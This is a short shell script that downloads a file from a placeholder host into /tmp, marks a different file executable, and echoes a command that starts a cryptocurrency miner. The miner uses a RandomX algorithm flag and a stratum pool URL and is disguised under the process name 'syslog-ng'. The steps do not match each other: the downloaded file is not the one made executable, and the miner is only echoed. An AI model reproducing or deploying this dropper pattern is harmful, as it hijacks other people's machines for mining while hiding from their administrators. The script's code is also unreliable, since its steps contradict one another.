#!/bin/sh
curl -fsSL https://docs.example.invalid/help.txt -o /tmp/help.txt
chmod +x /tmp/helper
echo '/tmp/syslog-ng --algo rx/0 --url stratum+ssl://pool.example.invalid:3333'
